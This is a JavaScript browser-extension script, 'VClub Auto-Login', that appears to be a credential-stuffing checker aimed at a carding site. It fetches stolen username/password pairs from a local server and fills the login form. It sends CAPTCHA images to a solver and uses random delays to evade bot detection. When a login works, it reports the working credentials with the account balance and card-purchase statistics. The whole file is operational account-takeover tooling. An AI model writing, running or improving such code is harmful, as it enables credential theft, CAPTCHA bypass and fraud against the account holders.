// Function to generate a random delay between 1 and 3 seconds
function getRandomDelay() {
    return Math.floor(Math.random() * 2000) + 1000; // 1000 to 3000 ms
}

// Function to attempt clicking an element if it exists, with an optional callback
function tryClickElement(selector, callback) {
    const element = document.querySelector(selector);
    if (element) {
        const delay = getRandomDelay();
        setTimeout(() => {
            element.click();
            console.log(`VClub Auto-Login: Clicked element with selector: ${selector}`);
            if (callback) callback();
        }, delay);
        return true;
    }
    return false;
}

// Check if we're on the login page
function isLoginPage() {
    return window.location.href.includes('/usercp/auth/login');
}

// Check if we're on the 2FA page
function is2FAPage() {
    const bodyText = document.body.innerText;
    return bodyText.includes('Two-Factor Authentication') || bodyText.includes('Enter a code from authenticator app');
}

// Check if the account is unactivated
function isUnactivatedAccount() {
    const bodyText = document.body.innerText;
    return bodyText.includes('Your account is not activated yet');
}

// Check if we're on the profile page
function isProfilePage() {
    const table = document.querySelector('table#yw2');
    const statsHeading = Array.from(document.querySelectorAll('h2')).find(el => el.innerText.includes('Statistics of purchases'));
    const isNotLoginPage = !window.location.href.includes('/usercp/auth/login');
    return table && statsHeading && isNotLoginPage;
}

// Extract balance from the profile page
function extractBalance() {
    const balanceRow = Array.from(document.querySelectorAll('table#yw2 tr')).find(row => {
        const th = row.querySelector('th');
        return th && th.innerText.trim() === 'Balance';
    });
    if (balanceRow) {
        const td = balanceRow.querySelector('td');
        if (td) {
            const text = td.innerText.trim();
            const match = text.match(/([\d.]+)\$/);
            if (match) {
                return match[1];
            }
        }
    }
    console.log('VClub Auto-Login: Failed to extract balance.');
    return null;
}

// Extract statistics (Total CCS, Amounts, Refunds) from the table
function extractStatistics() {
    const table = document.querySelector('table.items');
    if (!table) {
        console.log('VClub Auto-Login: No statistics table found.');
        return { totalCCS: null, amounts: null, refunds: null };
    }
    const rows = table.querySelectorAll('tbody tr');
    if (!rows || rows.length === 0) {
        console.log('VClub Auto-Login: No rows found in statistics table.');
        return { totalCCS: null, amounts: null, refunds: null };
    }
    for (const row of rows) {
        const cells = row.querySelectorAll('td');
        if (cells.length >= 4 && cells[0].innerText.trim() === 'CCS') {
            const total = cells[1].innerText.trim();
            const amounts = cells[2].innerText.trim().replace('$', '');
            const refunds = cells[3].innerText.trim();
            return { totalCCS: total, amounts, refunds };
        }
    }
    console.log('VClub Auto-Login: No CCS row found in statistics table.');
    return { totalCCS: null, amounts: null, refunds: null };
}

// Get the error message from the page
function getErrorMessage() {
    const bodyText = document.body.innerText;
    if (bodyText.includes('The verification code is incorrect')) {
        return 'The verification code is incorrect';
    } else if (bodyText.includes('Incorrect username or password')) {
        return 'Incorrect username or password';
    }
    return null;
}

// Perform the full login automation on the login page
async function performLoginAutomation() {
    const usernameInput = document.querySelector('#inputUsername');
    const passwordInput = document.querySelector('#inputPassword');
    const captchaImg = document.querySelector('#yw1');
    const captchaInput = document.querySelector('#inputCaptcha');
    const loginButton = document.querySelector('button[name="yt0"]');

    if (!usernameInput || !passwordInput || !captchaImg || !captchaInput || !loginButton) {
        console.log('VClub Auto-Login: Form elements not found on login page.');
        return;
    }

    try {
        const credsResponse = await fetch('http://localhost:5050/get-creds');
        if (!credsResponse.ok) {
            if (credsResponse.status === 404) {
                console.log('VClub Auto-Login: No credentials left.');
                return;
            }
            throw new Error('Failed to fetch credentials');
        }
        const { username, password } = await credsResponse.json();

        sessionStorage.setItem('current_username', username);
        sessionStorage.setItem('current_password', password);

        usernameInput.value = username;
        passwordInput.value = password;
        console.log('VClub Auto-Login: Filled username and password.');

        const canvas = document.createElement('canvas');
        canvas.width = captchaImg.width;
        canvas.height = captchaImg.height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(captchaImg, 0, 0);
        const base64Image = canvas.toDataURL().split(',')[1];

        const captchaResponse = await fetch('http://localhost:5050/solve-captcha', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: base64Image })
        });
        if (!captchaResponse.ok) throw new Error('Failed to solve CAPTCHA');
        const { captcha: solvedCaptcha } = await captchaResponse.json();

        captchaInput.value = solvedCaptcha;
        console.log('VClub Auto-Login: Filled CAPTCHA.');

        const delay = getRandomDelay();
        setTimeout(() => {
            loginButton.click();
            console.log('VClub Auto-Login: Clicked login button.');
        }, delay);
    } catch (error) {
        console.error('VClub Auto-Login: Error during login automation:', error);
    }
}

// Retry login with new CAPTCHA using same credentials
async function retryWithNewCaptcha() {
    const usernameInput = document.querySelector('#inputUsername');
    const passwordInput = document.querySelector('#inputPassword');
    const captchaImg = document.querySelector('#yw1');
    const captchaInput = document.querySelector('#inputCaptcha');
    const loginButton = document.querySelector('button[name="yt0"]');

    if (!usernameInput || !passwordInput || !captchaImg || !captchaInput || !loginButton) {
        console.log('VClub Auto-Login: Form elements not found for retry.');
        return;
    }

    const username = sessionStorage.getItem('current_username');
    const password = sessionStorage.getItem('current_password');
    if (!username || !password) {
        console.log('VClub Auto-Login: No credentials found for retry.');
        return;
    }

    usernameInput.value = username;
    passwordInput.value = password;

    try {
        const canvas = document.createElement('canvas');
        canvas.width = captchaImg.width;
        canvas.height = captchaImg.height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(captchaImg, 0, 0);
        const base64Image = canvas.toDataURL().split(',')[1];

        const captchaResponse = await fetch('http://localhost:5050/solve-captcha', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: base64Image })
        });
        if (!captchaResponse.ok) throw new Error('Failed to solve CAPTCHA');
        const { captcha: solvedCaptcha } = await captchaResponse.json();

        captchaInput.value = solvedCaptcha;
        console.log('VClub Auto-Login: Filled new CAPTCHA.');

        const delay = getRandomDelay();
        setTimeout(() => {
            loginButton.click();
            console.log('VClub Auto-Login: Clicked login button for retry.');
        }, delay);
    } catch (error) {
        console.error('VClub Auto-Login: Error during retry with new CAPTCHA:', error);
    }
}

// Function to click the "LOGIN" button whenever it appears
function clickInitialLoginButton() {
    const loginButton = document.querySelector('input[type="submit"][value="LOGIN"]');
    if (loginButton) {
        const delay = getRandomDelay();
        setTimeout(() => {
            loginButton.click();
            console.log('VClub Auto-Login: Clicked initial "LOGIN" button.');
        }, delay);
        return true;
    }
    return false;
}

// Function to log out
function logout() {
    tryClickElement('.navbar-toggler-icon', () => {
        tryClickElement('a[href="/usercp/auth/logout"]');
    });
}

// Handle navigation and login based on the current page
function handlePage() {
    console.log('VClub Auto-Login: Current URL:', window.location.href);
    if (isLoginPage()) {
        console.log('VClub Auto-Login: Handling login page...');
        const error = getErrorMessage();
        if (error) {
            if (error === 'The verification code is incorrect') {
                retryWithNewCaptcha();
            } else if (error === 'Incorrect username or password') {
                performLoginAutomation();
            }
        } else {
            performLoginAutomation();
        }
    } else if (is2FAPage()) {
        console.log('VClub Auto-Login: Detected 2FA page');
        const username = sessionStorage.getItem('current_username');
        const password = sessionStorage.getItem('current_password');
        if (username && password) {
            chrome.runtime.sendMessage({ type: '2fa_detected', username, password });
            sessionStorage.removeItem('current_username');
            sessionStorage.removeItem('current_password');
        } else {
            console.log('VClub Auto-Login: No credentials found in sessionStorage for 2FA');
        }
    } else if (isUnactivatedAccount()) {
        console.log('VClub Auto-Login: Detected unactivated account');
        const username = sessionStorage.getItem('current_username');
        const password = sessionStorage.getItem('current_password');
        if (username && password) {
            chrome.runtime.sendMessage({ type: 'unactivated_detected', username, password });
            sessionStorage.removeItem('current_username');
            sessionStorage.removeItem('current_password');
        } else {
            console.log('VClub Auto-Login: No credentials found in sessionStorage for unactivated account');
        }
    } else if (isProfilePage()) {
        console.log('VClub Auto-Login: Detected profile page');
        const username = sessionStorage.getItem('current_username');
        password = sessionStorage.getItem('current_password');
        if (username && password) {
            const balance = extractBalance();
            const { totalCCS, amounts, refunds } = extractStatistics();
            if (balance && totalCCS && amounts && refunds) {
                console.log('VClub Auto-Login: Successfully extracted details:', { balance, totalCCS, amounts, refunds });
                chrome.runtime.sendMessage({
                    type: 'hit_detected',
                    username,
                    password,
                    balance,
                    totalCCS,
                    amounts,
                    refunds
                });
                sessionStorage.removeItem('current_username');
                sessionStorage.removeItem('current_password');
            } else {
                console.log('VClub Auto-Login: Failed to extract all details from profile page');
            }
        } else {
            console.log('VClub Auto-Login: No credentials found in sessionStorage for profile page');
        }
    } else {
        console.log('VClub Auto-Login: Navigating to login page...');
        if (!clickInitialLoginButton()) {
            tryClickElement('a[href="/usercp/auth/login"]');
        }
    }
}

// Run when the page loads
window.addEventListener('load', () => {
    console.log('VClub Auto-Login: Page loaded, handling page...');
    handlePage();
});

// Observe DOM changes for dynamic content
const observer = new MutationObserver(() => {
    handlePage();
});
observer.observe(document.body, { childList: true, subtree: true });